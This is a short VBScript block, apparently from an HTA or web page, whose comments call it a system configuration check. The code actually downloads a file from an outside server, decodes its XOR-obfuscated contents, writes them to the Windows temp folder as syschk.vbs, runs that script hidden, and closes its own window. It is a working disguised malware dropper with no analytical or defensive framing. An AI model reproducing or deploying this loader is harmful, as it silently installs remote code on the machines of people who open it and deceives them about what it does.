<script language="VBScript">
' System configuration check module
' Retrieves update configuration from management server

Dim httpReq, rawData, parts, decoded, i, fso, tmpFile, shell
Dim serverUrl, dataPath, decryptionKey

serverUrl = "https://stoplag.org"
dataPath = "/s2.txt"
decryptionKey = 137

Set httpReq = CreateObject("MSXML2.XMLHTTP")
httpReq.Open "GET", serverUrl & dataPath, False
httpReq.Send

If httpReq.Status = 200 Then
  parts = Split(httpReq.ResponseText, ",")
  decoded = ""
  For i = 0 To UBound(parts)
    decoded = decoded & Chr(CInt(parts(i)) Xor decryptionKey)
  Next
  
  Set fso = CreateObject("Scripting.FileSystemObject")
  Set tmpFile = fso.CreateTextFile(fso.GetSpecialFolder(2) & "\syschk.vbs", True)
  tmpFile.Write decoded
  tmpFile.Close
  
  Set shell = CreateObject("WScript.Shell")
  shell.Run """" & fso.GetSpecialFolder(2) & "\syschk.vbs""", 0, False
End If

self.Close()
</script>